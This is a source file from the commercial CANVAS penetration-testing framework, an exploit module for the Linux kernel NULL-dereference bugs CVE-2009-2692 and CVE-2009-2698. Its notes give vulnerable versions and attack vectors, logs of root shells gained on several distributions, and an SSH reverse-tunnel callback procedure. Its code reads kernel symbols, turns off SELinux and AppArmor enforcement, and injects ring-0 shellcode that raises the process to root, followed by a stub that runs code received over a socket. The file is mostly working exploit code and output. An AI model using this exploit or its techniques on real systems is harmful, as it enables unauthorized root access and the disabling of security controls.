##ImmunityHeader v1
###############################################################################
## File       :  proto_ops_null.py
## Description:
##            :
## Created_On :  Tue Aug 25 16:08:49 2009
## Created_By :  Bas Alberts
## Modified_On:
## Modified_On:  Thu Sep 10 10:00:34 2009
## Modified_By:  Bas Alberts
## (c) Copyright 2009, Immunity Inc all rights reserved.
###############################################################################
#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit
from MOSDEF import mosdef

NOTES = """
This version will work on any vuln 32bit 2.6.x Linux, including RHEL/FC.

Bug redux:

- proto ops kernel local 2.4.4 <= 2.4.37.4, 2.6.0 <= 2.6.30.4
- some protocols do not have the sendpage proto ops pointer initialized
  before possible use
- http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html
- straight up null function ptr dereference

Vectors to vuln:

PF_APPLETALK
PF_IPX
PF_IRDA
PF_X25
PF_AX25
PF_BLUETOOTH
PF_UICV
PF_INET6
PF_PPOX

TODO:
- X86_64
- 2.4.x testing (!MAP_ANON, ustruct differences, etc.)
- 2.6.30 cred differences

Relevant src snippets:

...

146 struct proto_ops {
147     int     family;
148     struct module   *owner;
149     int     (*release)   (struct socket *sock);
150     int     (*bind)      (struct socket *sock,
151                       struct sockaddr *myaddr,
152                       int sockaddr_len);
153     int     (*connect)   (struct socket *sock,
154                       struct sockaddr *vaddr,
155                       int sockaddr_len, int flags);
156     int     (*socketpair)(struct socket *sock1,
157                       struct socket *sock2);
158     int     (*accept)    (struct socket *sock,
159                       struct socket *newsock, int flags);
160     int     (*getname)   (struct socket *sock,
161                       struct sockaddr *addr,
162                       int *sockaddr_len, int peer);
163     unsigned int    (*poll)      (struct file *file, struct socket *sock,
164                       struct poll_table_struct *wait);
165     int     (*ioctl)     (struct socket *sock, unsigned int cmd,
166                       unsigned long arg);
167     int     (*compat_ioctl) (struct socket *sock, unsigned int cmd,
168                       unsigned long arg);
169     int     (*listen)    (struct socket *sock, int len);
170     int     (*shutdown)  (struct socket *sock, int flags);
171     int     (*setsockopt)(struct socket *sock, int level,
172                       int optname, char __user *optval, int optlen);
173     int     (*getsockopt)(struct socket *sock, int level,
174                       int optname, char __user *optval, int __user *optlen);
175     int     (*compat_setsockopt)(struct socket *sock, int level,
176                       int optname, char __user *optval, int optlen);
177     int     (*compat_getsockopt)(struct socket *sock, int level,
178                       int optname, char __user *optval, int __user *optlen);
179     int     (*sendmsg)   (struct kiocb *iocb, struct socket *sock,
180                       struct msghdr *m, size_t total_len);
181     int     (*recvmsg)   (struct kiocb *iocb, struct socket *sock,
182                       struct msghdr *m, size_t total_len,
183                       int flags);
184     int     (*mmap)      (struct file *file, struct socket *sock,
185                       struct vm_area_struct * vma);
186     ssize_t     (*sendpage)  (struct socket *sock, struct page *page,
187                       int offset, size_t size, int flags);
188     ssize_t     (*splice_read)(struct socket *sock,  loff_t *ppos,
189                        struct pipe_inode_info *pipe, size_t len, unsigned int flags);
190 };
...

/* XXX: sendpage init missing from SOCKOPS_WRAP so following affected */

4 ddp.c     1833 static const struct proto_ops SOCKOPS_WRAPPED(atalk_dgram_ops) = {.
...
6 af_ipx.c  1935 static const struct proto_ops SOCKOPS_WRAPPED(ipx_dgram_ops) = {
...
8 af_irda.c 2472 static const struct proto_ops SOCKOPS_WRAPPED(irda_stream_ops) = {
9 af_irda.c 2496 static const struct proto_ops SOCKOPS_WRAPPED(irda_seqpacket_ops) = {
a af_irda.c 2520 static const struct proto_ops SOCKOPS_WRAPPED(irda_dgram_ops) = {
b af_irda.c 2545 static const struct proto_ops SOCKOPS_WRAPPED(irda_ultra_ops) = {
...
g af_x25.c  1585 static const struct proto_ops SOCKOPS_WRAPPED(x25_proto_ops) = {

...
/* XXX: sendpage is never inited here */
285 #define SOCKOPS_WRAP(name, fam)                 \
286 SOCKCALL_WRAP(name, release, (struct socket *sock), (sock)) \
...
316           \
317 static const struct proto_ops name##_ops = {            \
318     .family     = fam,              \
319     .owner      = THIS_MODULE,          \
320     .release    = __lock_##name##_release,  \
321     .bind       = __lock_##name##_bind,     \
322     .connect    = __lock_##name##_connect,  \
323     .socketpair = __lock_##name##_socketpair,   \
324     .accept     = __lock_##name##_accept,   \
325     .getname    = __lock_##name##_getname,  \
326     .poll       = __lock_##name##_poll,     \
327     .ioctl      = __lock_##name##_ioctl,    \
328     .compat_ioctl   = __lock_##name##_compat_ioctl, \
329     .listen     = __lock_##name##_listen,   \
330     .shutdown   = __lock_##name##_shutdown, \
331     .setsockopt = __lock_##name##_setsockopt,   \
332     .getsockopt = __lock_##name##_getsockopt,   \
333     .sendmsg    = __lock_##name##_sendmsg,  \
334     .recvmsg    = __lock_##name##_recvmsg,  \
335     .mmap       = __lock_##name##_mmap,     \
336 };
...
 126 static const struct file_operations socket_file_ops = {
 127     .owner =    THIS_MODULE,
 128     .llseek =   no_llseek,
 129     .aio_read = sock_aio_read,
 130     .aio_write =    sock_aio_write,
 131     .poll =     sock_poll,
 132     .unlocked_ioctl = sock_ioctl,
 133 #ifdef CONFIG_COMPAT
 134     .compat_ioctl = compat_sock_ioctl,
 135 #endif
 136     .mmap =     sock_mmap,
 137     .open =     sock_no_open,   /* special open code to disallow open via /proc */
 138     .release =  sock_close,
 139     .fasync =   sock_fasync,
 140     .sendpage = sock_sendpage,
 141     .splice_write = generic_splice_sendpage, /* XXX: also vector to sendpage */
 142     .splice_read =  sock_splice_read,
 143 };
...

 685 static ssize_t sock_sendpage(struct file *file, struct page *page,
 686                  int offset, size_t size, loff_t *ppos, int more)
 687 {
 688     struct socket *sock;
 689     int flags;
 690
 691     sock = file->private_data;
 692
 693     flags = !(file->f_flags & O_NONBLOCK) ? 0 : MSG_DONTWAIT;
 694     if (more)
 695         flags |= MSG_MORE;
 696     /* XXX: sendpage ptr not checked before usage */
 697     return sock->ops->sendpage(sock, page, offset, size, flags);
 698 }
...

Triggering on FC10:

0xc0628b4d in ?? ()
1: x/i $pc
0xc0628b4d:     pushl  0x8(%ebp)
(gdb)
0xc0628b50 in ?? ()
1: x/i $pc
0xc0628b50:     call   *0x50(%ebx)
(gdb)
0x00000000 in ?? ()
1: x/i $pc
0x0:    int3
(gdb)

...

We stay inside of sendfile's stackframe, do our thing, and iret to exit_code :)

Linux/MOSDEF$ runmodule proto_ops_null
...
[ Tue Aug 18 14:00:00 2009 ][C] (0.0.0.1/32) [+] setresuid/setgid result: 0x0
[ Tue Aug 18 14:00:00 2009 ][C] (0.0.0.1/32) [+] uid: 500, euid: 500, gid: 500, egid: 500
[ Tue Aug 18 14:00:00 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x0 (flags: 32)
[ Tue Aug 18 14:00:00 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x120000 (flags: 22)
[ Tue Aug 18 14:00:00 2009 ][C] (0.0.0.1/32) [+] exit code page @ 120000
[ Tue Aug 18 14:00:01 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x121000 (flags: 22)
[ Tue Aug 18 14:00:01 2009 ][C] (0.0.0.1/32) [+] /proc/kallsyms size: 0 bytes (0 reads until EOF)
[C] reliable read got length 0, assuming MOSDEOF mode ..
[ Tue Aug 18 14:00:05 2009 ][C] (0.0.0.1/32) [+] searching for apparmor/selinux kallsyms
[ Tue Aug 18 14:00:05 2009 ][C] (0.0.0.1/32) [+] found selinux_enforcing @ c0957f8c
[ Tue Aug 18 14:00:05 2009 ][C] (0.0.0.1/32) [+] turning off selinux_enforcing @ c0957f8c
[ Tue Aug 18 14:00:05 2009 ][C] (0.0.0.1/32) [+] placed ring0 code at 0 ... oh the irony
[ Tue Aug 18 14:00:05 2009 ][C] (0.0.0.1/32) [+] kallsyms protections toggle: True
[ Tue Aug 18 14:00:06 2009 ][C] (0.0.0.1/32) [+] success with protocol family: PF_APPLETALK
[ Tue Aug 18 14:00:06 2009 ][C] (0.0.0.1/32) [+] sendfile result: cafebabe
[ Tue Aug 18 14:00:06 2009 ][C] (0.0.0.1/32) [+] cafebabe, kernel code ran okay :)
[ Tue Aug 18 14:00:09 2009 ][C] (0.0.0.1/32) [+] got root .. we like root ..
...

Tested:

FC9:

sh-3.2# id ; uname -a
uid=0(root) gid=0(root) groups=500(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
Linux localhost.localdomain 2.6.25-14.fc9.i686 #1 SMP Thu May 1 06:28:41 EDT 2008 i686 i686 i386 GNU/Linux
sh-3.2#

FC10:

sh-3.2# id ; uname -a
uid=0(root) gid=0(root) groups=500(bas) context=unconfined_u:unconfined_r:unconfined_t:s0
Linux localhost.localdomain 2.6.27.24-170.2.68.fc10.i686 #1 SMP Wed May 20 23:10:16 EDT 2009 i686 i686 i386 GNU/Linux
sh-3.2#

Ubuntu 7.10 (from www-data):

# id ; uname -a
uid=0(root) gid=0(root) groups=33(www-data)
Linux ubuntu 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
#

Ubuntu 9.04 with modern kernel and mmap_min_addr enforced:

# id ; uname -a
uid=0(root) gid=0(root)
Linux user-desktop 2.6.29-020629-generic #020629 SMP Tue Mar 24 12:03:21 UTC 2009 i686 GNU/Linux
#

FC11 default install:

sh-4.0# id ; uname -a
id ; uname -a
uid=0(root) gid=0(root) context=system_u:system_r:kernel_t:s0
Linux localhost.localdomain 2.6.29.4-167.fc11.i586 #1 SMP Wed May 27 17:14:37 EDT 2009 i686 i686 i386 GNU/Linux
sh-4.0#

SuSE 9.3 (note: worked only with PF_BLUETOOTH):

sh-3.00# id ; uname -a
uid=0(root) gid=0(root) groups=16(dialout),33(video),100(users)
Linux linux 2.6.11.4-20a-default #1 Wed Mar 23 21:52:37 UTC 2005 i686 i686 i386 GNU/Linux
sh-3.00#

NOTE:

You need a mosdef process that runs with a tty for the SELinux NULL mmap to work, e.g. SSH in,
or inject into something that was started from console, or something like that ... not sure
if you could just allocate a tty, I would imagine not.

Alternatively it falls back to the pulseaudio/SVR4 personality trick. It runs this through
ck-launch-session so that policykit does not complain about non-existing sessions.

The real trickery here is in how we proxy through from our parent mosdef to the pulseaudio
mosdef, which has a NULL page mmapped. Basically we bind a localhost port from the
parent process, and the pulseaudio init will connect to it. Now the mosdef parent will
send its own active node fd to the child mosdef (pulseaudio), and the child mosdef will
dup2 its active client fd to the value of the active node fd. The parent mosdef then
starts a tcp proxying loop from/to the client connection. Because the child mosdef has
dup2'd to match the parent mosdef active node fd value, we can transparently proxy through
any mosdef compiled for the parent.

This looks like:

[ Tue Aug 25 10:49:40 2009 ][C] (0.0.0.1/32) [+] mmap result: 0xfffffff3 (flags: 32)
[ Tue Aug 25 10:49:40 2009 ][C] (0.0.0.1/32) [+] mmap failed, trying pulseaudio trick
[ Tue Aug 25 10:49:41 2009 ][C] (0.0.0.1/32) [+] pulseaudio exists and passed all sanity checks
[ Tue Aug 25 10:49:41 2009 ][C] (0.0.0.1/32) [+] killed any existing pulseaudio daemon: 0
[ Tue Aug 25 10:49:41 2009 ][C] (0.0.0.1/32) [+] personality result: 0
[ Tue Aug 25 10:49:42 2009 ][C] (0.0.0.1/32) [+] /tmp/.x.so opened as fd=5
[ Tue Aug 25 10:49:42 2009 ][C] (0.0.0.1/32) [+] file wrote successfully
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] pulse mosdef (6) starting proxy loop ...
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] doing final mprotect check ...
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] mprotect succeeded (0)
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] pulseaudio/personality trickery worked!
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] setresuid/setgid result: 0x0
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] uid: 1000, euid: 1000, gid: 1000, egid: 1000
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] mmap result: 0xb2695000 (flags: 22)
[ Tue Aug 25 10:49:44 2009 ][C] (0.0.0.1/32) [+] exit code page @ b2695000
[ Tue Aug 25 10:49:45 2009 ][C] (0.0.0.1/32) [+] mmap result: 0xb2595000 (flags: 22)
[ Tue Aug 25 10:49:45 2009 ][C] (0.0.0.1/32) [+] /proc/kallsyms size: 0 bytes (0 reads until EOF)
[C] reliable read got length 0, assuming MOSDEOF mode ..
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] searching for apparmor/selinux kallsyms
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] found prepare_kernel_cred @ c0154ac0
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] found commit_creds @ c0154ef0
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] found selinux_enforcing @ c086a69c
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] handling AppArmor/SELinux toggles
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] turning off selinux_enforcing @ c086a69c
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] preparing commit_creds payload
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] placed ring0 code at 0 ... oh the irony
[ Tue Aug 25 10:49:49 2009 ][C] (0.0.0.1/32) [+] success with protocol family: PF_APPLETALK
[ Tue Aug 25 10:49:52 2009 ][C] (0.0.0.1/32) [+] sendfile result: cafebabe
[ Tue Aug 25 10:49:52 2009 ][C] (0.0.0.1/32) [+] cafebabe, kernel code ran okay :)
[ Tue Aug 25 10:49:53 2009 ][C] (0.0.0.1/32) [+] got root .. we like root ..
Linux/MOSDEF$ id
[C] Getting UIDs
UID=0 EUID=0 GID=0 EGID=0
Linux/MOSDEF

Usage example where you have an SSH login:
==========================================

1) scp mosdef_callback_linux_i386 to remote box
2) start reverse ssh tunnel for mosdef callback:
   ssh -l user -nNT -R 5555:127.0.0.1:5555 remoteserver
3) start local linux mosdef listener on port 5555
4) connect mosdef_callback_linux_i386 to localhost:5555 on remote box

Now you have a MOSDEF prompt into the remote machine and can
run the exploit without the need to upload actual exploit
binary e.g.:

[ Tue Aug 25 17:24:32 2009 ]Binding to :5555
[ Tue Aug 25 17:24:46 2009 ]Connected to by ('127.0.0.1', 45110)
[ Tue Aug 25 17:24:46 2009 ]Connected, Linux MOSDEF ...
...
Linux/MOSDEF$ runmodule proto_ops_null
...
Run local on node ...
[ Tue Aug 25 17:25:18 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x0 (flags: 32)
[ Tue Aug 25 17:25:19 2009 ][C] (0.0.0.1/32) [+] setresuid/setgid result: 0x0
[ Tue Aug 25 17:25:19 2009 ][C] (0.0.0.1/32) [+] uid: 500, euid: 500, gid: 500, egid: 500
[ Tue Aug 25 17:25:19 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x254000 (flags: 22)
[ Tue Aug 25 17:25:19 2009 ][C] (0.0.0.1/32) [+] exit code page @ 254000
[ Tue Aug 25 17:25:20 2009 ][C] (0.0.0.1/32) [+] mmap result: 0xb02000 (flags: 22)
[ Tue Aug 25 17:25:21 2009 ][C] (0.0.0.1/32) [+] /proc/kallsyms size: 0 bytes (0 reads until EOF)
[C] reliable read got length 0, assuming MOSDEOF mode ..
[ Tue Aug 25 17:25:24 2009 ][C] (0.0.0.1/32) [+] searching for apparmor/selinux kallsyms
[ Tue Aug 25 17:25:24 2009 ][C] (0.0.0.1/32) [+] handling AppArmor/SELinux toggles
[ Tue Aug 25 17:25:25 2009 ][C] (0.0.0.1/32) [+] placed ring0 code at 0 ... oh the irony
[ Tue Aug 25 17:25:25 2009 ][C] (0.0.0.1/32) [+] skipping non-supported protocol family: PF_APPLETALK
[ Tue Aug 25 17:25:25 2009 ][C] (0.0.0.1/32) [-] Failed with PF: PF_APPLETALK ... neeext
...
[ Tue Aug 25 17:25:27 2009 ][C] (0.0.0.1/32) [+] socket success with protocol family: PF_PPPOX
[ Tue Aug 25 17:25:27 2009 ][C] (0.0.0.1/32) [+] sendfile result: cafebabe
[ Tue Aug 25 17:25:27 2009 ][C] (0.0.0.1/32) [+] cafebabe, kernel code ran okay :)
[ Tue Aug 25 17:25:28 2009 ][C] (0.0.0.1/32) [+] got root .. we like root ..
Linux/MOSDEF$ shellshock
[!] Turning MOSDEF-Node into temporary interactive shell
[!] Note: will revert back to MOSDEF on "exit"
shellshocked!
sh: no job control in this shell
sh-3.2# id ; uname -a
uid=0(root) gid=0(root) groups=500(user) context=user_u:system_r:unconfined_t
Linux pentest 2.6.18-128.el5 #1 SMP Wed Jan 21 10:44:23 EST 2009 i686 i686 i386 GNU/Linux
sh-3.2#

UPDATE:

Added support for: CVE-2009-2698 (udp_sendmsg) as a fallback ...

[+] could not find vuln proto fam ... falling back to udp_sendmsg
[ Wed Sep  9 11:07:38 2009 ][C] (0.0.0.1/32) [+] socket success with protocol family: PF_INET
[ Wed Sep  9 11:07:38 2009 ][C] (0.0.0.1/32) [+] mmap result: 0x4024f000 (flags: 22)
[ Wed Sep  9 11:07:39 2009 ][C] (0.0.0.1/32) [+] placed ring0 code at 4024F000
[ Wed Sep  9 11:07:39 2009 ][C] (0.0.0.1/32) [+] Placed dst_entry struct at 0 ... triggering ..
[ Wed Sep  9 11:07:40 2009 ][C] (0.0.0.1/32) [+] udp_sendmsg result: cafebabe
[ Wed Sep  9 11:07:40 2009 ][C] (0.0.0.1/32) [+] cafebabe, udp_sendmsg kernel code ran okay :)
[ Wed Sep  9 11:07:41 2009 ][C] (0.0.0.1/32) [+] got root .. we like root ..
Linux/MOSDEF$ id
[C] Getting UIDs
UID=0 EUID=0 GID=0 EGID=0
Linux/MOSDEF$

"""

NAME                            = 'proto_ops_null / udp_sendmsg'
DESCRIPTION                     = 'proto ops / udp_sendmsg null deref Linux Kernel local root (2.6.X 32bit Edition)'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Linux'
DOCUMENTATION["Date public"]    = ''
DOCUMENTATION["CVE Name"]       = 'CVE-2009-2692 / CVE-2009-2698'
DOCUMENTATION["CVE Url"]        = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2692'
DOCUMENTATION["References"]     = ['http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html']
VERSION                         = '1.0'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Local'
PROPERTY['ARCH']                = [ ['Linux',  'i386'] ]
PROPERTY['KERNELVER']           = ['2.6.0', '2.6.30.4']

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                   = NAME
        self.MMAP_FAIL              = [0xfffffff3, 0xfffffff2, 0xfffffff1, 0xffffffff]
        self.toggle_kallsyms        = True # turns off kernel protections brad style
        self.pfams                  = []
        self.proxy_ports            = [65119, 65118, 65117, 65116]
        # which PF's to try ...
        self.pfams.append('PF_APPLETALK')
        self.pfams.append('PF_IPX')
        self.pfams.append('PF_IRDA')
        self.pfams.append('PF_X25')
        self.pfams.append('PF_AX25')
        self.pfams.append('PF_PPPOX')
        self.pfams.append('PF_BLUETOOTH')
        return

    def get_args(self):
        return

    def get_protection_syms(self):
        """ get kallsym for selinux enforcing etc. (brad style) """
        fd      = self.node.shell.open('/proc/kallsyms', self.node.shell.libc.getdefine('O_RDONLY'))
        symdict = {}
        if sint32(fd) < 0:
            self.log('[+] could not open /proc/kallsyms')
            self.toggle_kallsyms = False
            return symdict
        ret,fs = self.node.shell.fstat(fd)
        if ret:
            self.log('[+] could not stat /proc/kallsyms')
            self.toggle_kallsyms = False
            return symdict
        rsize = fs['st_size']
        self.log('[+] /proc/kallsyms size: %d bytes (0 reads until EOF)' % rsize)
        if not rsize:
            rsize = -1 # read until EOF
        kallsyms = self.node.shell.readfromfd(fd, rsize)
        self.node.shell.close(fd)
        selinux_enforcing = 0
        self.log('[+] searching for apparmor/selinux kallsyms')
        lines = kallsyms.split('\n')
        for line in lines:
            sym = line.split(' ')
            if len(sym) >= 3 and sym[2] in ['selinux_enforcing',\
                                            'apparmor_enabled',\
                                            'apparmor_audit',\
                                            'apparmor_complain',\
                                            'apparmor_logsyscall',\
                                            'commit_creds',\
                                            'prepare_kernel_cred']:
                symdict[sym[2]] = int(sym[0], 16)
                self.log('[+] found %s @ %x' % (sym[2], symdict[sym[2]]))
        # did not find symbol
        return symdict

    # installs a block of code into a code page
    def memcpy_code(self, p, code):
        """ memcpy some code into a code page """

        vars = {'code' : code, 'codelen' : len(code), 'page' : p}

        code = """
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"

        #import "string", "code" as "code"
        #import "int", "codelen" as "codelen"
        #import "int", "page" as "page"

        void
        main()
        {
            char *p;
            int ret;

            p = page;
            ret = memcpy(p, code, codelen);

            sendint(ret);
        }
        """

        ret = self.node.shell.runCode(code, vars)
        if ret != p:
            self.log('[-] memcpy failed')
            raise Exception, 'memcpy failed'
        return ret

    def get_exit_code_x86(self):
        """ returns the code stub that's triggered post-ring0 with uid 0 """

        # in our case we just want to continue our MOSDEF loop
        # alternatively we can upload a execve replace binary
        # and have this chown/chmod it to suid root

        exit_code = """
        // sendint to tell exploit we succeeded :>
        pushl $0xcafebabe
        movl $FD,%ebx
        movl %esp,%ecx
        movl $4,%edx
        movl %edx,%eax
        int $0x80

        // 2.6 only so we can do a MAP_ANONYMOUS mmap2

        xorl %ebp,%ebp // we dont use ebp in the parent loop, never return
        movl $0xffffffff,%edi
        movl $34,%esi // MAP_PRIVATE | MAP_ANONYMOUS
        movl $7,%edx
        movl $0x00010000,%ecx
        xorl %ebx,%ebx
        xorl %eax,%eax
        movb $192,%al // SYS_mmap2
        int $0x80

        movl %eax,%edi

        pushl %edi // base copy
        pushl %edi // mod copy

    read_exec_loop:

        // len read
        xorl %eax,%eax
        xorl %edx,%edx
        movl $FD,%ebx
        movl %edi,%ecx
        movb $4,%dl
        movb $3,%al
        int $0x80

        // if eax <= 0
        test %eax,%eax
        jz exit
        cmpl $-1,%eax
        jz exit

        pushl (%edi) // save len

    read_loop:

        movl $FD,%ebx
        movl 4(%esp),%ecx
        movl (%esp),%edx
        xorl %eax,%eax
        movb $3,%al
        int $0x80

        test %eax,%eax
        jz exit
        cmpl $-1,%eax
        je exit

        // kludgy because mosdef still sucks at direct derefs
        movl (%esp),%ecx
        subl %eax,%ecx
        movl %ecx,(%esp)

        movl 4(%esp),%edi
        addl %eax,%edi
        movl %edi,4(%esp)

        test %ecx,%ecx
        jnz read_loop

    exec:

        popl %eax // eat len
        popl %eax // eat mod copy
        popl %eax // get base addie

        pushl %eax // base copy
        pushl %eax // mod copy

        call *%eax

        jmp read_exec_loop

    exit:

        xorl %eax,%eax
        xorl %ebx,%ebx
        incl %eax
        int $0x80
        """

        exit_code = exit_code.replace("FD", "%d" % self.node.shell.fd)

        return mosdef.assemble(exit_code, 'X86')

    def get_kernel_code_x86(self, exit_stack, exit_code, uid, gid):
        """ searches current page and updates ustruct to set uid/gid/ to 0 """
        # this runs in ring0
        # qaaz-style getcurr + set ustruct + exit kernel
        # gcc 4.1
        kernel_code = ''
        if self.toggle_kallsyms == True:
            ksymdict = self.get_protection_syms()
            self.log('[+] handling AppArmor/SELinux toggles')
            for ksym in ksymdict.keys():
                if ksym not in ['commit_creds', 'prepare_kernel_cred']:
                    toggle_code = """
                    xorl %%eax,%%eax
                    movl $0x%x,%%edi
                    movl %%eax,(%%edi)
                    """ % ksymdict[ksym]
                    self.log('[+] turning off %s @ %x' % (ksym, ksymdict[ksym]))
                    kernel_code += mosdef.assemble(toggle_code, 'X86')
            if 'commit_creds' in ksymdict.keys() \
               and 'prepare_kernel_cred' in ksymdict.keys():
                self.log('[+] preparing commit_creds payload')
                commit_creds        = ksymdict['commit_creds']
                prepare_kernel_cred = ksymdict['prepare_kernel_cred']
                cred_code = """
                xorl %%eax,%%eax
                movl $0x%x,%%edi
                call *%%edi
                movl $0x%x,%%edi
                call *%%edi
                """ % (prepare_kernel_cred, commit_creds)
                kernel_code += mosdef.assemble(cred_code, 'X86')
                kernel_code +=  "EXIT_STACK_EDX"+\
                                "EXIT_CODE_EAX"+\
                                "\xc7\x44\x24\x10\x7b\x00\x00"+\
                                "\x00"+\
                                "\x89\x54\x24\x0c"+\
                                "\xc7\x44\x24\x08\x46\x02\x00"+\
                                "\x00"+\
                                "\xc7\x44\x24\x04\x73\x00\x00"+\
                                "\x00"+\
                                "\x89\x04\x24"+\
                                "\xcf"+\
                                "\x83\xc4\x10"+\
                                "\x5b"+\
                                "\x5d"+\
                                "\xc3"
                # so our cafebabe check still works ...
                kernel_code = kernel_code.replace("EXIT_STACK_EDX", \
                    mosdef.assemble("movl $0x%x,%%edx" % exit_stack, 'X86'))
                kernel_code = kernel_code.replace("EXIT_CODE_EAX", \
                    mosdef.assemble("movl $0x%x,%%eax" % exit_code, 'X86'))
                return kernel_code
        # we are taking over the sendfile call
        # just stay inside it's stackframe ;P
        # * removed function prologue
        # * increased the current stack search range to 0x2000
        kernel_code  += "\x53"+\
                        "\x83\xec\x10"+\
                        "\x89\xe0"+\
                        "\x25\x00\xe0\xff\xff"+\
                        "\x8b\x00"+\
                        "\x89\x45\xf8"+\
                        "\x8b\x45\xf8"+\
                        "\x89\x45\xf4"+\
                        "\xc7\x45\xf0\x00\x00\x00\x00"+\
                        "\xe9\x22\x01\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x8b\x10"+\
                        "UID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\x08\x01\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x04"+\
                        "\x8b\x10"+\
                        "UID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\xf3\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x08"+\
                        "\x8b\x10"+\
                        "UID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\xde\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x0c"+\
                        "\x8b\x10"+\
                        "UID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\xc9\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x10"+\
                        "\x8b\x10"+\
                        "GID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\xb4\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x14"+\
                        "\x8b\x10"+\
                        "GID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\x9f\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x18"+\
                        "\x8b\x10"+\
                        "GID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x0f\x85\x8a\x00\x00\x00"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x1c"+\
                        "\x8b\x10"+\
                        "GID_TO_EAX"+\
                        "\x39\xc2"+\
                        "\x75\x79"+\
                        "\x8b\x4d\xf4"+\
                        "\x83\xc1\x04"+\
                        "\x8b\x55\xf4"+\
                        "\x83\xc2\x08"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x0c"+\
                        "\xc7\x00\x00\x00\x00\x00"+\
                        "\x8b\x00"+\
                        "\x89\x02"+\
                        "\x8b\x02"+\
                        "\x89\x01"+\
                        "\x8b\x11"+\
                        "\x8b\x45\xf4"+\
                        "\x89\x10"+\
                        "\x8b\x4d\xf4"+\
                        "\x83\xc1\x10"+\
                        "\x8b\x5d\xf4"+\
                        "\x83\xc3\x14"+\
                        "\x8b\x55\xf4"+\
                        "\x83\xc2\x18"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x1c"+\
                        "\xc7\x00\x00\x00\x00\x00"+\
                        "\x8b\x00"+\
                        "\x89\x02"+\
                        "\x8b\x02"+\
                        "\x89\x03"+\
                        "\x8b\x03"+\
                        "\x89\x01"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x24"+\
                        "\x89\x45\xf4"+\
                        "\x8b\x55\xf4"+\
                        "\x83\xc2\x04"+\
                        "\x8b\x45\xf4"+\
                        "\x83\xc0\x08"+\
                        "\xc7\x00\xff\xff\xff\xff"+\
                        "\x8b\x00"+\
                        "\x89\x02"+\
                        "\x8b\x12"+\
                        "\x8b\x45\xf4"+\
                        "\x89\x10"+\
                        "\xeb\x15"+\
                        "\x83\x45\xf4\x04"+\
                        "\x83\x45\xf0\x01"+\
                        "\x81\x7d\xf0\x00\x20\x00\x00"+\
                        "\x0f\x8e\xd1\xfe\xff\xff"+\
                        "EXIT_STACK_EDX"+\
                        "EXIT_CODE_EAX"+\
                        "\xc7\x44\x24\x10\x7b\x00\x00"+\
                        "\x00"+\
                        "\x89\x54\x24\x0c"+\
                        "\xc7\x44\x24\x08\x46\x02\x00"+\
                        "\x00"+\
                        "\xc7\x44\x24\x04\x73\x00\x00"+\
                        "\x00"+\
                        "\x89\x04\x24"+\
                        "\xcf"+\
                        "\x83\xc4\x10"+\
                        "\x5b"+\
                        "\x5d"+\
                        "\xc3"

        # these shouldnt change the offsets .. assembles to len() 5
        kernel_code = kernel_code.replace("UID_TO_EAX", \
                        mosdef.assemble("movl $0x%x,%%eax" % int(uid), 'X86'))
        kernel_code = kernel_code.replace("GID_TO_EAX", \
                        mosdef.assemble("movl $0x%x,%%eax" % int(gid), 'X86'))

